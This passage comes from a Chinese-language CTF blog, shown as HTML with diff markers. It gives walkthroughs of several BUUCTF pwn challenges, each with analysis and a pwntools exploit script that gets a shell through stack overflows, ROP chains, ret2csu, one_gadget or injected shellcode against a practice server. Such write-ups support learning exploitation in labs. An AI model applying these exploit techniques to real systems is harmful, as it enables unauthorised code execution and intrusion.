class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="第五空间2019决赛PWN5"><a href="#第五空间2019决赛PWN5" class="headerlink" title="第五空间2019决赛PWN5"></a>第五空间2019决赛PWN5</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>查看程序的安全机制</p>
-<p><img src="buuctf-pwn1/image-20200907171415275.png" alt="image-20200907171415275"></p>
-<p>安全机制开启了好几个，除了PIE都开了</p>
-<p>IDA反汇编查看main函数</p>
-<p><img src="buuctf-pwn1/image-20200907171504354.png" alt="image-20200907171504354"></p>
-<p>设置了个随机数，读入两个输入，并和其进行比较，如果输入的pass和随机数相等则调用<code>/bin/sh</code></p>
-<p>这里两个输入都进行了长度限制，不存在直接溢出的问题</p>
-<p>但是看到在printf密码之前，有一个<code>printf(&amp;buf)</code>的语句</p>
-<p>尝试运行输入很长的内容，可以看到输入出现了一些问题，因此可能是格式化字符串的漏洞</p>
-<p><img src="buuctf-pwn1/image-20200907171852085.png" alt="image-20200907171852085"></p>
-<p>根据上面代码的思路，首先用格式化字符串漏洞打印出<code>unk_804C044</code>缓冲区中数字的值</p>
-<p>之后再输入密码的时候输入这个数字就可以了</p>
-<p>那么这里需要涉及到的问题就是格式化字符串漏洞的任意地址读问题</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>输入<code>aaaa</code>以及若干个<code>%x</code>，可以根据输出中<code>aaaa</code>字符出现的偏移确定buf和栈帧的距离</p>
-<p><img src="buuctf-pwn1/image-20200907172756891.png" alt="image-20200907172756891"></p>
-<h2 id="Jarvisoj-level0"><a href="#Jarvisoj-level0" class="headerlink" title="Jarvisoj_level0"></a>Jarvisoj_level0</h2><p>这道题就是一个很基础的pwn，溢出之后直接覆盖返回地址为get_flag的地址就可以</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./level0&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28376</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>首先检查安全机制</p>
-<p><img src="image-20201101105215030.png" alt="image-20201101105215030"></p>
-<p>开启了NX；</p>
-<p>运行一下，发现是一个需要输入用户名</p>
-<p>查找对system函数的调用，可以发现存在一个后门函数dl_registery</p>
-<p><img src="image-20201101105611971.png" alt="image-20201101105611971"></p>
-<p>main函数中对输入的name做了一个检查</p>
-<p><img src="image-20201101105649086.png" alt="image-20201101105649086"></p>
-<p>这里的name_check应该是一个长度检查的函数</p>
-<p><img src="image-20201101105733721.png" alt="image-20201101105733721"></p>
-<p>按说输入的name长度在4-8之间就可以通过，但是试了之后发现并不可以；</p>
-<p>主要原因在于这个检查是和unsigned int比较的；</p>
-<p>所以实际上这里输入的数字很大时可以绕过，因为v3是一个unsigned int8，所以最大255</p>
-<p>这里要求4-8，所以可以用长度在255+4-255+8之间绕过，这样最低的8位是满足要求的</p>
-<p>最后看返回的地方，是将可控的缓冲区s用strcpy复制到了dest这个地方；</p>
-<p>这里距离堆栈还有0x11的距离，之后加上ebp的4个字节，一共需要填充0x15字节</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./r2t3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x11</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload = payload + p32(<span class="number">0x0804858b</span>)</span><br><span class="line">payload = payload + (<span class="number">255</span>+<span class="number">5</span>-len(payload))*<span class="string">&#x27;c&#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one gadget"></a>[BJDCTF 2nd]one gadget</h2><p>程序是64位的，首先checksec</p>
-<p><img src="image-20201101141818205.png" alt="image-20201101141818205"></p>
-<p>运行一下之后首先有一个说<code>here is a gift for u</code></p>
-<p>这里直接输出了printf的地址，拿这个地址可以去查到libc的基地址和版本</p>
-<p><img src="image-20201101142701814.png" alt="image-20201101142701814"></p>
-<p>之后要求输入一个<code>gadget</code></p>
-<p><img src="image-20201101142126563.png" alt="image-20201101142126563"></p>
-<p>在程序的函数中可以看到</p>
-<p><img src="image-20201101142037053.png" alt="image-20201101142037053"></p>
-<p>直接就是跳到了这个gadget的位置</p>
-<p>那么思路就是，通过printf的地址计算出libc的基地址；</p>
-<p>之后用one_gadget搜索其中的system或execve，直接把gadget输入给程序</p>
-<p><img src="image-20201102162750820.png" alt="image-20201102162750820"></p>
-<p>测试后最后一个gadget是可以正常执行的</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26587</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./one_gadget&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.29.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_offset = libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27; u:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_addr = int(io.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = printf_addr - printf_offset</span><br><span class="line">gadget = <span class="number">0x106ef8</span></span><br><span class="line"></span><br><span class="line">io.sendline(str(libc_base+gadget)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>执行一下的效果</p>
-<p><img src="image-20201102171957552.png" alt="image-20201102171957552"></p>
-<p>是一个输入名字的程序</p>
-<p>安全机制基本都开了</p>
-<p><img src="image-20201102172023608.png" alt="image-20201102172023608"></p>
-<p>查看main函数，可以看到进行了一个判断，如果打到了这个点就会执行bin/sh</p>
-<p><img src="image-20201102172124594.png" alt="image-20201102172124594"></p>
-<p>但是我们输入<code>aaa</code>显然连那个大的判断if都没有进入</p>
-<p>这里观察一下其实就是让输入的<code>var[13]</code>不为0</p>
-<p>Var的长度超过14就可以，而调用了system的那个小if则是判断<code>var[13]</code>是否等于17</p>
-<p>只是要注意这里var是当作QWORD读的</p>
-<p>QWORD是4个字节，也就是说13*4+1的位置要是17</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./ciscn_2019&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;?\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">13</span>*<span class="number">4</span>+p64(<span class="number">17</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>检查安全机制</p>
-<p><img src="image-20201102192917583.png" alt="image-20201102192917583"></p>
-<p>只开启了NX</p>
-<p>main函数主要是一个gets输入</p>
-<p><img src="image-20201102193648677.png" alt="image-20201102193648677"></p>
-<p>看到这个v4和ebp存在0x2d的距离</p>
-<p>搜索字符串发现有一个<code>flag.txt</code></p>
-<p>查找reference找到这样一个<code>get_secret</code>函数</p>
-<p><img src="image-20201102193257668.png" alt="image-20201102193257668"></p>
-<p>这个函数首先打开了文件<code>flag.txt</code>，之后用<code>fgets</code>从<code>v0</code>句柄读内容到<code>fl4g</code>这段内存空间</p>
-<p><code>fl4g</code>位于bss段</p>
-<p><img src="image-20201102201744573.png" alt="image-20201102201744573"></p>
-<p>有了这些内容，我们想要构造的应该就是这样一个调用链：首先溢出控制返回地址，覆盖返回地址填写为<code>get_secret</code>函数，这个函数执行完毕之后会在bss段<code>fl4g</code>处写入<code>flag.txt</code>的内容；</p>
-<p>之后利用rop调用write函数读出来这个地方的值；</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25072</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line"></span><br><span class="line">get_secret = <span class="number">0x080489a0</span></span><br><span class="line">bss = <span class="number">0x080eca2d</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span> + p32(get_secret) + p32(elf.sym[<span class="string">&#x27;write&#x27;</span>]) + p32(bss) + p32(<span class="number">1</span>) + p32(bss) + p32(<span class="number">45</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>和之前那道题目类似，这个题目也存在另一种解法</p>
-<p>就是使用mprotect修改bss段的权限，之后再跳转到写在bss段的shellcode</p>
-<h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>首先查安全机制和架构</p>
-<p><img src="image-20201102204244975.png" alt="image-20201102204244975"></p>
-<p>运行一下效果就是输入一个字符串</p>
-<p><img src="image-20201102204313538.png" alt="image-20201102204313538"></p>
-<p>main函数的代码</p>
-<p><img src="image-20201102204414050.png" alt="image-20201102204414050"></p>
-<p>vulnerable 函数中的代码</p>
-<p><img src="image-20201102204442374.png" alt="image-20201102204442374"></p>
-<p>read了0x100，但是距离ebp只有0x88</p>
-<p>由于开启了nx，应该也是用rop来做了</p>
-<p>直接溢出，rop跳到system</p>
-<p><img src="image-20201102204549168.png" alt="image-20201102204549168"></p>
-<p>查找字符串还发现很贴心的给了<code>/bin/sh</code></p>
-<p>虽然这个字符串并没有调用的地方</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io  = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span> + elf.sym[<span class="string">&#x27;system&#x27;</span>] + elf.sym[<span class="string">&#x27;main&#x27;</span>] + elf.sym[<span class="string">&#x27;hint&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.readline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="BJDCTF-2020-babystack"><a href="#BJDCTF-2020-babystack" class="headerlink" title="[BJDCTF_2020] babystack"></a>[BJDCTF_2020] babystack</h2><p>首先checksec</p>
-<p><img src="image-20201103142341073.png" alt="image-20201103142341073"></p>
-<p>64位程序，开启了NX</p>
-<p>反编译得到main函数</p>
-<p><img src="image-20201103150115631.png" alt="image-20201103150115631"></p>
-<p>首先输入了一个数字，给到了nbytes</p>
-<p>之后用read来读入nbytes个字节到buf</p>
-<p>buf距离rbp存在0x10h</p>
-<p>另外文件中存在一个backdoor函数</p>
-<p><img src="image-20201103150253430.png" alt="image-20201103150253430"></p>
-<p>可以直接调用得到shell</p>
-<p>思路就是直接溢出0x10到rbp，然后8个字节rbp，最后覆盖返回地址到backdoor就完了</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./bjdctf_2020_babystack&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29781</span>)</span><br><span class="line"></span><br><span class="line">length = <span class="number">30</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">io.sendline(str(length))</span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x4006e6</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name?\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><p>首先checksec</p>
-<p><img src="image-20201103153919908.png" alt="image-20201103153919908"></p>
-<p>这个题目和之前的jarvisoj_level2基本是一样的思路，主要差异就在于这个是64位的</p>
-<p>因为是64位的，函数调用时不是先看栈里的数据，顺序首先是几个寄存器</p>
-<p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</p>
-<p>我们想要调用起来<code>system(&#39;/bin/sh&#39;)</code></p>
-<p>只需要这一个参数，所以需要将<code>/bin/sh</code>弹出到<code>rdi</code>中</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28844</span>)</span><br><span class="line"><span class="comment">#io  = process(&#x27;./level2&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4006b3</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(elf.sym[<span class="string">&#x27;hint&#x27;</span>]) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.readline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><p>首先检查安全机制</p>
-<p><img src="image-20201103165102208.png" alt="image-20201103165102208"></p>
-<p>运行尝试一下</p>
-<p><img src="image-20201103165214264.png" alt="image-20201103165214264"></p>
-<p>反编译得到main函数代码</p>
-<p><img src="image-20201103165340664.png" alt="image-20201103165340664"></p>
-<p>text距离rbp有20h</p>
-<p>这里的name是位于bss段的</p>
-<p><img src="image-20201103170309603.png" alt="image-20201103170309603"></p>
-<p>第一个read读name的时候可以读到<code>0x64</code>的长度</p>
-<p>之后gets函数是读text，这里可以溢出rbp</p>
-<p>那么思路应该就是首先在第一个输入name的时候将shellcode输入到bss段</p>
-<p>之后使用gets函数溢出rbp，跳转到bss那里执行代码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26740</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_2019_n_5&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name\n&#x27;</span>)</span><br><span class="line">payload1 = asm(shellcraft.amd64.linux.sh(),arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;name!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss_name = <span class="number">0x601080</span></span><br><span class="line">payload2 = <span class="number">0x20</span>*<span class="string">&#x27;a&#x27;</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + p64(bss_name)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="HarekazeCTF2019-babyrop"><a href="#HarekazeCTF2019-babyrop" class="headerlink" title="HarekazeCTF2019_babyrop"></a>HarekazeCTF2019_babyrop</h2><p>首先检查安全机制</p>
-<p><img src="image-20201105114634910.png" alt="image-20201105114634910"></p>
-<p>开启了NX，是64位的程序</p>
-<p>在IDA中反编译main函数</p>
-<p><img src="image-20201105114754145.png" alt="image-20201105114754145"></p>
-<p>输入了一个v4，之后输出，这里的scanf存在溢出</p>
-<p>数据段中存在一个后门字符串</p>
-<p><img src="image-20201105114914833.png" alt="image-20201105114914833"></p>
-<p>思路就是溢出返回地址，之后调用system函数</p>
-<p>payload还是比较简单的，和之前例子差不多</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./babyrop&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25747</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = elf.sym[<span class="string">&#x27;binsh&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) +  p64(bin_sh) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>但是拿到shell之后发现flag居然不在根目录，少见</p>
-<p><img src="image-20201105120131498.png" alt="image-20201105120131498"></p>
-<h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><p>首先检查安全机制</p>
-<p><img src="image-20201105215357163.png" alt="image-20201105215357163"></p>
-<p>开启了NX的32位程序</p>
-<p>运行后是一个输入password的地方</p>
-<p><img src="image-20201105215428495.png" alt="image-20201105215428495"></p>
-<p>反编译逆向看到</p>
-<p><img src="image-20201106113658304.png" alt="image-20201106113658304"></p>
-<p>输入administrator就可以过去，后面的程序是一个循环</p>
-<p>输出显示的只有4个选项，但是实际上看到switch中还有一个隐藏的选项</p>
-<p>AddLog这个选项通过scanf输入一个log，长度限制是128</p>
-<p><img src="image-20201106113741030.png" alt="image-20201106113741030"></p>
-<p>在GetFlag这个函数中有一个strcpy，但是这里的目标串dst距离ebp只有0x48</p>
-<p>因此有可能溢出</p>
-<p><img src="image-20201106113901780.png" alt="image-20201106113901780"></p>
-<p>在选项<code>Print</code>那里是用到了<code>system</code></p>
-<p>在程序中没有找到<code>/bin/sh</code></p>
-<p>但是存在<code>sh</code></p>
-<p>那么思路就是首先用第一个选项输入payload</p>
-<p>之后用选项4造成溢出并且调用<code>system(&quot;sh&quot;)</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28345</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_2019_ne_5&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_ne_5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;password:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n:&#x27;</span>)</span><br><span class="line">io.sendline(str(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x080482ea</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span> + p32(elf.sym[<span class="string">&#x27;system&#x27;</span>]) +p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])+ p32(sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(str(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p>首先checksec</p>
-<p><img src="image-20201106160828730.png" alt="image-20201106160828730"></p>
-<p>开启了NX的64位程序</p>
-<p>这个程序比较奇怪，反编译了vuln函数之后可以看到</p>
-<p><img src="image-20201106161721030.png" alt="image-20201106161721030"></p>
-<p>是调用了一次read，一次write</p>
-<p>但这里没法直接看到具体调用的参数，用gdb跑起来看一下</p>
-<p>跑到read这里的时候的三个参数分别是</p>
-<p><img src="image-20201106161814576.png" alt="image-20201106161814576"></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">read(<span class="number">0</span>,buf,<span class="number">0x400</span>);</span><br></pre></td></tr></table></figure>
-
-<p>也就是说从stdin读了最多0x400到栈上</p>
-<p>之后又调用了write函数，执行到这里的时候各个参数为</p>
-<p><img src="image-20201106162215451.png" alt="image-20201106162215451"></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x30</span>);</span><br></pre></td></tr></table></figure>
-
-<p>也就是说从栈上的buf将0x30长度的内容写到stdout上</p>
-<p>但是这个vuln函数向下执行的时候就没办法正常的返回了，因为栈上已经都是’a’了</p>
-<p>计算一下偏移，81-65=16</p>
-<p>由于开启了NX，这个明显要用ROP了</p>
-<p>由于是64位的程序，很可能是ret2csu</p>
-<p>另外程序还给了一个gadget的函数，里面存在几个可以用到的gadget</p>
-<p><img src="image-20201106221342423.png" alt="image-20201106221342423"></p>
-<p>这一个函数中给到了三个gadget</p>
-<p>这里给出的一个<code>mov rax,3Bh; retn</code></p>
-<p>之后可以尝试去调用<code>syscall</code>，因为<code>3Bh</code>对应的59在系统调用号中正好是<code>execve</code></p>
-<p><img src="image-20201106221705844.png" alt="image-20201106221705844"></p>
-<p>全部的系统调用号对应表：<a href="https://www.cnblogs.com/tcctw/p/11450449.html">https://www.cnblogs.com/tcctw/p/11450449.html</a></p>
-<p>如果我们想要执行<code>execve(&quot;/bin/sh&quot;)</code>，那么就需要在栈中存储这个字符串，之后将这个字符串的地址赋给rdi，最后调用execve</p>
-<p>在执行到write的那个syscall时，栈中rsi指向了栈中的buffer</p>
-<p><img src="image-20201106225441796.png" alt="image-20201106225441796"></p>
-<p>由于这里输出的是0x30的内容，此时栈顶是从上面字符串c开始的位置</p>
-<p><img src="image-20201106225608750.png" alt="image-20201106225608750"></p>
-<p>因此输出0x30的内容的话，会将栈中另外两个内容输出出来，这其中恰好有一个是指向栈上的地址</p>
-<p>在上面的图中就是<code>0x00007fffffffde38</code>以及另外一个<code>0x0000000100000000</code></p>
-<p>这个<code>de38</code>距离我们字符串的开头<code>dd20</code>相差了<code>0x118</code></p>
-<p>我们就可以用得到的这个值进行定位</p>
-<p>至于调用execve的过程，首先将rax设置为execve的调用号</p>
-<p>之后ret回来之后设置一下几个寄存器中的值</p>
-<p>需要注意的是，execve函数在调用时，实际上需要三个参数，最开始尝试直接运行<code>execve(&#39;/bin/sh&#39;)</code>失败了，网上查了说后面两个参数需要为0，也就是说在运行时我们需要令<code>rdi=*&quot;/bin/sh&quot;</code>, <code>rsi=0</code>, <code>rdx=0</code></p>
-<p>但是在gadget中搜索没有找到为rdx赋值的gadget</p>
-<p>我们就只能是用到ret2csu来控制rdx的值了</p>
-<p>首先执行<code>__libc_start_main</code>中的后面一部分pop</p>
-<p><img src="image-20201107111533619.png" alt="image-20201107111533619"></p>
-<p>之后执行前面那一块的mov</p>
-<p><img src="image-20201107111556821.png" alt="image-20201107111556821"></p>
-<p>这里我们的目的是给rdx赋值，所以需要控制r13</p>
-<p>由于我们设置rbx=0，实际上call的位置就是r12寄存器控制的，这里设置r12的值为栈上当前下一个地址，即pop_rdi的地址</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span> + p64(rax_3b) </span><br><span class="line">payload += p64(csu_pop) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(r12) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(r15)</span><br><span class="line">payload += p64(csu_mov)</span><br><span class="line">payload += p64(pop_rdi) + p64(payload_addr) + p64(syscall_addr)</span><br></pre></td></tr></table></figure>
-
-<p>写的时候发现一个问题就是第一次payload回来的位置不对，这个程序经过了一次调用vuln，所以回来的地址应该是<code>elf.sym[&#39;vuln&#39;]</code>，之前写成<code>main</code>就错了</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29878</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span> + p64(main)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">payload_addr = u64(io.recv(<span class="number">0x8</span>)) - <span class="number">0x118</span></span><br><span class="line">print(<span class="string">&#x27;payload address is:&#x27;</span>,hex(payload_addr))</span><br><span class="line">io.recv(<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">rax_3b = <span class="number">0x4004e2</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line"></span><br><span class="line">csu_pop = <span class="number">0x40059A</span></span><br><span class="line">csu_mov = <span class="number">0x400580</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span> + p64(rax_3b)</span><br><span class="line">payload += p64(csu_pop) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(payload_addr + <span class="number">0x58</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu_mov)</span><br><span class="line">payload += p64(pop_rdi) + p64(payload_addr) + p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这个题目还可以用SROP来做，之后有机会再写。</p>
-<h2 id="铁人三项-2018-rop"><a href="#铁人三项-2018-rop" class="headerlink" title="铁人三项_2018_rop"></a>铁人三项_2018_rop</h2><p>首先检查安全机制</p>
-<p><img src="image-20201107141506926.png" alt="image-20201107141506926"></p>
-<p>开启了NX的32位程序</p>
-<p>main函数反编译后发现里面按顺序调用了两个函数</p>
-<p><img src="image-20201107141740396.png" alt="image-20201107141740396"></p>
-<p>其中vulnerable_function存在溢出</p>
-<p><img src="image-20201107141800487.png" alt="image-20201107141800487"></p>
